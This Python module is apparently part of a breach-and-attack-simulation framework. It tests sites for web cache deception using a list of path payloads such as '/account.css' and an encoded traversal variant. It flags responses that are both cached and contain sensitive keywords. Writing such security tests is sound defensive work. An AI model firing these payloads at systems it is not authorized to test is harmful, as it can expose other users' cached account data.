"""Web Cache Deception testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

CACHE_PAYLOADS = ["/account.css", "/profile.js", "/settings.png", "/api/me.css",
    "/dashboard.ico", "/account%2f..%2fstatic.css", "/profile/nonexistent.css"]

class CacheDeceptionModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="cache_deception", description="Web cache deception / poisoning", category="cache_deception",
            mitre_technique_ids=["T1190"], mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, cwe_ids=["CWE-525"],
            tags=["cache", "deception", "information_disclosure"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        return CACHE_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        return [AttackRequest(request_id=f"cache-{uuid.uuid4().hex[:8]}", target=target, method="GET",
            path=p, headers={"X-BAS-Payload": p}) for p in payloads]

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        if response.status_code == 200:
            cache_headers = {k.lower(): v for k, v in response.headers.items()}
            is_cached = "hit" in cache_headers.get("x-cache", "").lower() or "hit" in cache_headers.get("cf-cache-status", "").lower()
            has_sensitive = any(k in response.body_text.lower() for k in ["email", "token", "session", "account"])
            if is_cached and has_sensitive:
                return ModuleResult(module_name="cache_deception", target=request.target, status=VulnStatus.VULNERABLE,
                    payload_used=payload, response_code=response.status_code, response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms, evidence="Cache deception: sensitive data in cached response",
                    severity="high", mitre_technique_id="T1190")
        return ModuleResult(module_name="cache_deception", target=request.target, status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
